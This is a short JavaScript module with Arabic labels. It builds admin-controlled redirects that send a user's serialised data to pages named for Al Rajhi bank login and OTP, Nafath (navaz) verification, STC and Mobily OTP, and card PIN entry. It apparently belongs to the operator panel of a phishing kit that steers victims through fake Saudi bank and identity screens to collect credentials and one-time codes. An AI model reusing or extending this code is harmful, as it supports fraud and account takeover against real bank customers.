export const SITE_PAGES = [
  { path: "/", label: "الرئيسية" },
  { path: "/cart", label: "السلة" },
  { path: "/checkout", label: "الدفع" },
  { path: "/checkout/otp", label: "OTP الدفع" },
];

function orderPayload(user) {
  const { __v, ...rest } = user;
  return rest;
}

function dataSearch(user, extra = {}) {
  const payload = { ...orderPayload(user), ...extra };
  return `?data=${encodeURIComponent(JSON.stringify(payload))}`;
}

export function buildAdminRedirect(user, page) {
  const id = user._id;
  const provider = user.phoneNetwork || "اس تي سي";
  const baseSession = { id, provider };

  switch (page.path) {
    case "/":
      return { path: "/", search: "", session: baseSession };

    case "/new-date":
      return { path: "/new-date", search: "", session: baseSession };

    case "/payment-summary":
    case "/payment-form":
    case "/payment-verify":
      return {
        path: page.path,
        search:
          page.step === "pin"
            ? `${dataSearch(user)}&step=pin`
            : dataSearch(user),
        session: { ...baseSession, method: user.method || "mada" },
      };

    case "/phone":
      return {
        path: "/phone",
        search: dataSearch(user),
        session: baseSession,
      };

    case "/phoneOtp":
    case "/stcOtp":
    case "/mobilyOtp":
    case "/navazOtp":
    case "/rajhi-login":
    case "/rajhi-otp":
    case "/rajhi-call-waiting":
    case "/success":
      return { path: page.path, search: dataSearch(user), session: baseSession };

    case "/navaz": {
      const params = new URLSearchParams();
      if (user.navazCode) params.set("otp", user.navazCode);
      const search = params.toString() ? `?${params.toString()}` : "";
      return { path: "/navaz", search, session: baseSession };
    }

    default:
      return { path: page.path, search: "", session: baseSession };
  }
}
